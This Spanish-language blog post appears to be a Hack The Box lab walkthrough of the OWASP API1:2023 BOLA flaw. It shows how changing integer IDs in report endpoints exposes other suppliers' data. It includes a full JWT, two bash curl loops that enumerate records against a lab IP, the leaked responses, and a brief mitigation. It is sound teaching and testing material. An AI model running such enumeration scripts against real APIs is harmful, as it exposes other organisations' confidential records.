---
title: "API1:2023 Broken Object Level Authorization"
date: 2026-01-25
header:
  image: /assets/images/guias/API1_2023.png
  teaser: /assets/images/guias/API1_2023.png
excerpt: "BOLA (API1:2023) ocurre cuando una API no verifica permisos por objeto y basta cambiar un ID en la ruta o el body para acceder o modificar recursos de otros usuarios. En este post verás cómo identificarlo, explotarlo de forma controlada y corregirlo con controles de autorización consistentes."
excerpt_separator: "<!--more-->"
categories:
  - guias
feature: true
---
Las API web permiten a los usuarios solicitar datos o registros enviando varios parámetros. No verificar de forma adecuada y segura que un usuario tenga propiedad y permiso para ver un recurso específico a través de mecanismos de autorizacion a nivel de objetos puede provocar exposición de datos y vulnerabilidades de seguridad.

El OWASP API Security Top 10 es una lista de las diez vulnerabilidades de seguridad más críticas en las API, publicada por la fundación OWASP. La edición más reciente, lanzada en 2023, actualiza y reorganiza los riesgos identificados en la versión anterior (2019), reflejando el panorama de amenazas actual.

La API1:2023 - Autorización a nivel de objeto rota (BOLA)
Es el riesgo más común y grave, presente en aproximadamente el 40% de los ataques a APIs. Ocurre cuando una API no valida correctamente si un usuario tiene permiso para acceder a un objeto específico (por ejemplo, un ID de usuario o pedido), permitiendo el acceso no autorizado a datos sensibles.

Para mostrar esta vulnerabilidad usare un entorno controlado que tiene la vulnerabilidad [CWE-639: Omisión de autorización a través de una clave controlada por el usuario](https://cwe.mitre.org/data/definitions/639.html).

Se me ha proporcionado la credencial `htbpentester2@pentestercompany.com:HTBPentester2`. Esta cuenta pertenece a un proveedor por lo que utilizare el punto final `/api/v1/authentication/suppliers/sign-in` para iniciar sesión y obtener un JWT. Puedo acceder a la API web a través de un [Swagger](https://swagger.io/tools/swagger-ui/) en la maquina objetivo.

![alt text](/assets/images/posts/API1_2023_BOLA/image.png)

Lo primero que hare sera autentificarme para obtener el JWT que me permitira interactuar con la API. Para ello tomo las credenciales que me han suministrado y uso el punto final `/api/v1/authentication/suppliers/sign-in` para iniciar sesion

![alt text](/assets/images/posts/API1_2023_BOLA/image-1.png)

Sustityo los valores string por los valores de la credencial y ejecuto 

![alt text](/assets/images/posts/API1_2023_BOLA/image-2.png)

Al ser una ejecucion satisfactoria la API me devuelve el JWT. 

![alt text](/assets/images/posts/API1_2023_BOLA/image-3.png)


```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2ODc3Nzg2NywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.5uv2erjbDuTErX6A2RmnevZQn2qtSO7y5IPDJXpSXOAlfXpAkLREPR5Fby7P6_hMxc3KHU3UagyzQwtGy9oNSg"
}
```

Para autenticarme usando el JWT, lo copiare de la respuesta y hare clic en el boton `Authorize`.

![alt text](/assets/images/posts/API1_2023_BOLA/image-5.png)

![alt text](/assets/images/posts/API1_2023_BOLA/image-6.png)

Ya que la cuenta que me han suministrado es de tipo "Proveedores" comprobare el usuario con el que tengo para conocer mas datos sobre el usando el punto final que contiene `current-user` en su ruta ya que utiliza el JWT del usuario actualmente autenticado para realizar la operación especificada, que en este caso es recuperar los datos del usuario actual.

En el menu de proveedores

![alt text](/assets/images/posts/API1_2023_BOLA/image-7.png)

Selecciono `/api/v1/suppliers/current-user` y ejecuto para obtener los datos.

![alt text](/assets/images/posts/API1_2023_BOLA/image-8.png)

![alt text](/assets/images/posts/API1_2023_BOLA/image-9.png)

```json
{
  "supplier": {
    "id": "781391c3-c6e3-4f42-bea4-1e71b6d9b4e7",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester2",
    "email": "htbpentester2@pentestercompany.com",
    "phoneNumber": "+44 9999 999992"
  }
}
```

Ademas de los datos que me suministraron para realizar el pentest he obtenido el ID del usuario, el ID de la compañia del usuario y un numero de telefono. 

El siguiente paso natural es conocer los roles asociados al usuario. Esto lo puedo lograr mediante el punto final `/api/v1/roles/current-user`

![alt text](/assets/images/posts/API1_2023_BOLA/image-10.png)

Al ejecutar obtengo los roles asociados al usuario.

![alt text](/assets/images/posts/API1_2023_BOLA/image-11.png)


```json
{
  "roles": [
    "SupplierCompanies_GetYearlyReportByID",
    "Suppliers_GetQuarterlyReportByID"
  ]
}
```

En el apartado `Supplier-Companies`, hay un punto final relacionado con el rol `SupplierCompanies_GetYearlyReportByID` 

![alt text](/assets/images/posts/API1_2023_BOLA/image-13.png)

Este punto final acepta un parámetro GET: `/api/v1/supplier-companies/yearly-reports/{ID}`. Ademas requiere el `SupplierCompanies_GetYearlyReportByID` rol y acepta el `ID` parámetro como número entero y no como `Guid`.

![alt text](/assets/images/posts/API1_2023_BOLA/image-14.png)

Como el usuario que tengo tiene este rol puedo ejecutar dando el valor ID que quiera, por ejemplo "1".

![alt text](/assets/images/posts/API1_2023_BOLA/image-15.png)

Esto me devuelve un registro el cual no es de la compañia del usuario que tengo autorizado, por lo que estare accediendo a datos de otros proveedores.

![alt text](/assets/images/posts/API1_2023_BOLA/image-16.png)

```json
{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
  }
}
```

Al probar otras identificaciones, puedo acceder a informes anuales de otras empresas proveedoras, lo que nos permite acceder a datos comerciales potencialmente confidenciales.

Además, puedo abusar masivamente de la vulnerabilidad `BOLA` y obtener los primeros 20 informes anuales de las empresas de proveedores del cliente. 

Para esto copio el cURL que me ofrece `Swagger` 

![alt text](/assets/images/posts/API1_2023_BOLA/image-17.png)

Si lo añado a un bucle en bash puedo obtener todos los datos.

```bash
for ((i=1; i<= 20; i++)); do
curl -X 'GET' \
  'http://94.237.49.88:58561/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2ODc3Nzg2NywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.5uv2erjbDuTErX6A2RmnevZQn2qtSO7y5IPDJXpSXOAlfXpAkLREPR5Fby7P6_hMxc3KHU3UagyzQwtGy9oNSg' | jq
done
```

Obteniendo como respuesta:

```json
{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 2,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2022,
    "revenue": 339322952,
    "commentsFromCLevel": "Excellent performance! The Board is exhilarated! Prepare for a special vacation adventure!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 3,
    "companyID": "058ac1e5-3807-47f3-b546-cc069366f8f9",
    "year": 2020,
    "revenue": 186208503,
    "commentsFromCLevel": "Phenomenal performance! The Board is deeply impressed! Everyone will be treated to a deluxe vacation!"
  }
}
<y continua...>
```

Recordemos que el usuario tambien pertenecia al rol `Suppliers_GetQuarterlyReportByID` busco su punto final para usarlo y ver si tambien es vulnerable. 

Compruebo con la ejecucion de  `/api/v1/suppliers/quarterly-reports/{ID}` que me solicita tambien un ID de tipo int y como requisito me solicita tener el rol `Suppliers_GetQuarterlyReportByID` 

![alt text](/assets/images/posts/API1_2023_BOLA/image-18.png)

La ejecucion me devuelve los datos para un ID de proveedor que no es el del usuario que estoy autorizado.

![alt text](/assets/images/posts/API1_2023_BOLA/image-20.png)

De la misma forma que anteriormente se puede abusar  masivamente de la vulnerabilidad `BOLA` usando el cURL que obtengo de la API y añadiendolo a un bucle for en bash

![alt text](/assets/images/posts/API1_2023_BOLA/image-19.png)

```sh
$ for ((i=1; i<= 20; i++)); do
curl -X 'GET' \
  'http://94.237.49.88:58561/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2ODc3Nzg2NywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.5uv2erjbDuTErX6A2RmnevZQn2qtSO7y5IPDJXpSXOAlfXpAkLREPR5Fby7P6_hMxc3KHU3UagyzQwtGy9oNSg' | jq
done
```

Al ejecutarlo obtengo datos que no deberia ser posible acceder ya que son de otras compañias de proveedores.

![alt text](/assets/images/posts/API1_2023_BOLA/image-21.png)

![alt text](/assets/images/posts/API1_2023_BOLA/image-22.png)

Entre ellas obtengo datos conficenciales como una flag de HTB

```json
HTB{e76651e1 <redacted> 754776}
```

### Mitigacion

Para mitigar la vulnerabilidad `BOLA`, el punto final `/api/v1/supplier-companies/yearly-reports` deberia implementar un paso de verificación (a nivel de código fuente) para garantizar que los usuarios autorizados solo puedan acceder a los informes anuales asociados con su empresa afiliada. Esta verificación implica comparar el `companyID` campo del informe con el proveedor autenticado `companyID`. 

El acceso debe concederse sólo si estos valores coinciden; de lo contrario, la solicitud debe denegarse. Este enfoque mantiene eficazmente la segregación de datos entre los informes anuales de las empresas proveedoras.


